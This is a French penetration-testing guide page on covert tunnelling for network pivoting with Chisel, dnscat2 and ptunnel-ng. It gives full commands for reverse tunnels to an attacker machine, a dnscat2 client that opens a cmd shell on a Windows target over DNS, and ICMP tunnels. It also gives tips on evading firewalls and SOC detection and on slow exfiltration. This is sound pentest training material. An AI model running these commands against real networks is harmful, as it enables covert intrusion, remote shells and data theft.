# Tunnels avances : Chisel, DNS et ICMP

Quand SSH est bloque ou surveille, des protocoles alternatifs permettent d'etablir des tunnels : Chisel encapsule du SOCKS5 dans HTTP/WebSocket securise par SSH, dnscat2 fait transiter les donnees dans des requetes DNS, et ptunnel-ng utilise les paquets ICMP (ping). Ces techniques sont particulierement utiles pour contourner les firewalls restrictifs ou echapper a la detection.

## Pourquoi

Les firewalls d'entreprise bloquent souvent SSH sortant mais autorisent HTTP, DNS et ICMP. Un firewall qui bloque tout sauf le web laisse passer Chisel (HTTP). Un firewall qui autorise les ping laisse passer un tunnel ICMP. Le DNS est rarement filtre car il est indispensable au fonctionnement du reseau, ce qui en fait un canal de tunneling discret.

## Comment ca marche

### Chisel (SOCKS5 via HTTP)

Chisel est un outil ecrit en Go qui cree un tunnel TCP/UDP via HTTP, securise par SSH. Il fonctionne en mode client-serveur et supporte le reverse tunneling.

#### Mode normal (serveur sur le pivot)

```bash
# - Sur le pivot : demarrer le serveur Chisel
./chisel server -v -p 1234 --socks5

# - Sur notre machine : se connecter en client
./chisel client -v <IP_PIVOT>:1234 socks
```

Le client cree un proxy SOCKS5 local sur le port 1080. Configurer proxychains :

```
socks5 127.0.0.1 1080
```

```bash
# - Utiliser le tunnel
proxychains xfreerdp /v:172.16.5.19 /u:user /p:password
```

#### Mode reverse (serveur sur notre machine)

Quand le firewall bloque les connexions entrantes sur le pivot, utiliser le mode reverse : le serveur tourne chez nous, le client sur le pivot initie la connexion sortante.

```bash
# - Sur notre machine : serveur avec --reverse
sudo ./chisel server --reverse -v -p 1234 --socks5

# - Sur le pivot : client en mode reverse
./chisel client -v <IP_ATTAQUANT>:1234 R:socks
```

Le proxy SOCKS5 ecoute sur notre machine (port 1080).

{% hint style="warning" %}
Des incompatibilites de version GLIBC peuvent empecher Chisel de fonctionner. Utiliser une version precompilee ancienne (ex: 1.7.7) depuis les releases GitHub pour maximiser la compatibilite.
{% endhint %}

### Dnscat2 (tunneling DNS)

Dnscat2 fait transiter les donnees dans des enregistrements TXT DNS. Le serveur dnscat2 tourne sur notre machine d'attaque et agit comme serveur DNS autoritaire. Le client sur la cible envoie des requetes DNS qui contiennent les donnees encapsulees.

#### Setup

```bash
# - Installer le serveur (notre machine)
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install

# - Demarrer le serveur DNS
sudo ruby dnscat2.rb --dns host=<IP_ATTAQUANT>,port=53,domain=corp.local --no-cache
```

Le serveur affiche une cle pre-partagee (pre-shared secret) a utiliser sur le client.

#### Connexion depuis la cible Windows

```powershell
# - Importer le client PowerShell
Import-Module .\dnscat2.ps1

# - Etablir le tunnel
Start-Dnscat2 -DNSserver <IP_ATTAQUANT> -Domain corp.local \
    -PreSharedSecret <CLE> -Exec cmd
```

#### Interagir avec la session

```bash
# - Lister les sessions
dnscat2> windows

# - Interagir avec une session
dnscat2> window -i 1

# - On obtient un shell sur la cible
C:\Windows\system32>
```

{% hint style="info" %}
Le tunneling DNS est extremement discret car le trafic DNS est rarement inspecte en profondeur. En revanche, il est lent (le DNS n'est pas concu pour transporter de gros volumes de donnees). C'est ideal pour les shells interactifs et l'exfiltration lente, pas pour le transfert de fichiers volumineux.
{% endhint %}

### Ptunnel-ng (tunneling ICMP)

Ptunnel-ng encapsule le trafic TCP dans des paquets ICMP (echo request/reply). Si le firewall autorise les ping, on peut faire transiter n'importe quel trafic TCP a travers.

```bash
# - Sur le pivot : demarrer le serveur ptunnel-ng
sudo ./ptunnel-ng -r<IP_PIVOT> -R22

# - Sur notre machine : se connecter au serveur
sudo ./ptunnel-ng -p<IP_PIVOT> -l2222 -r<IP_PIVOT> -R22
```

Le trafic vers notre port local 2222 est encapsule dans des paquets ICMP et envoye au pivot, qui le redirige vers son propre port SSH (22).

```bash
# - SSH via le tunnel ICMP
ssh -p2222 -l user 127.0.0.1

# - SSH dynamique via le tunnel ICMP
ssh -D 9050 -p2222 -l user 127.0.0.1
```

Une fois le tunnel ICMP + SSH dynamique etabli, on retrouve un proxy SOCKS classique :

```bash
proxychains nmap -sT -Pn 172.16.5.19 -p 3389
```

{% hint style="danger" %}
Le tunneling ICMP necessite les privileges root des deux cotes (pour creer des raw sockets). C'est un vecteur puissant mais qui peut generer un volume de trafic ICMP anormal, detectable par un IDS/IPS configure pour surveiller ce protocole.
{% endhint %}

## En pratique

```bash
# Chisel (le plus polyvalent)
# Pivot : ./chisel server -v -p 1234 --socks5
# Attaquant : ./chisel client -v <IP>:1234 socks
# proxychains <outil> <cible>

# Dnscat2 (le plus discret)
# Attaquant : sudo ruby dnscat2.rb --dns host=<IP>,port=53,domain=corp.local
# Cible Windows : Start-Dnscat2 -DNSserver <IP> -Domain corp.local -PreSharedSecret <cle> -Exec cmd

# Ptunnel-ng (quand seul ICMP passe)
# Pivot : sudo ./ptunnel-ng -r<IP> -R22
# Attaquant : sudo ./ptunnel-ng -p<IP> -l2222 -r<IP> -R22
# ssh -D 9050 -p2222 -l user 127.0.0.1
```

## Pieges et galeres

{% tabs %}
{% tab title="Chisel" %}
- **Version GLIBC** : le binaire Chisel compile sur un systeme recent peut ne pas fonctionner sur un vieux serveur. Telecharger une version precompilee ancienne
- **Port 1080 occupe** : si le port 1080 est deja utilise, specifier un port different dans le client et dans proxychains
- **Detection** : le trafic Chisel est du WebSocket sur HTTP. Un proxy d'entreprise qui inspecte le contenu HTTP peut le detecter
{% endtab %}
{% tab title="DNS / ICMP" %}
- **Dnscat2 et Python** : le serveur necessite Ruby et Bundler. Le client Windows (dnscat2-powershell) necessite l'execution de scripts PowerShell, qui peut etre bloquee par la politique d'execution
- **Ptunnel-ng et compilation** : ptunnel-ng doit etre compile sur le pivot. Si le compilateur n'est pas disponible, compiler un binaire statique sur notre machine et le transferer
- **Volume de trafic** : le tunneling DNS et ICMP genere un volume de trafic inhabituel sur ces protocoles. Un SOC attentif detectera un pic soudain de requetes DNS TXT ou de paquets ICMP volumineux
{% endtab %}
{% endtabs %}

## Retour terrain

Chisel est devenu l'outil de pivoting prefere de beaucoup de pentesters. Sa polyvalence (mode normal et reverse), sa portabilite (un seul binaire Go), et son chiffrement natif en font une alternative serieuse a SSH quand celui-ci n'est pas disponible.

Le tunneling DNS avec dnscat2 est rare en pentest classique mais courant dans les exercices Red Team ou l'objectif est d'eviter la detection. Le trafic DNS est tellement omnipresent qu'il se fond dans le bruit de fond du reseau.

Le tunneling ICMP avec ptunnel-ng est un vecteur de dernier recours, utile quand vraiment rien d'autre ne passe. En pratique, c'est surtout un outil a connaitre pour les CTF et les scenarios ou le firewall est extremement restrictif.

## Memo express

| Outil | Protocole | Commande serveur | Commande client |
|---|---|---|---|
| Chisel | HTTP/WS | `chisel server -p 1234 --socks5` | `chisel client <ip>:1234 socks` |
| Chisel reverse | HTTP/WS | `chisel server --reverse -p 1234 --socks5` | `chisel client <ip>:1234 R:socks` |
| Dnscat2 | DNS | `ruby dnscat2.rb --dns host=<ip>,port=53` | `Start-Dnscat2 -DNSserver <ip>` |
| Ptunnel-ng | ICMP | `ptunnel-ng -r<ip> -R22` | `ptunnel-ng -p<ip> -l2222 -r<ip> -R22` |

***
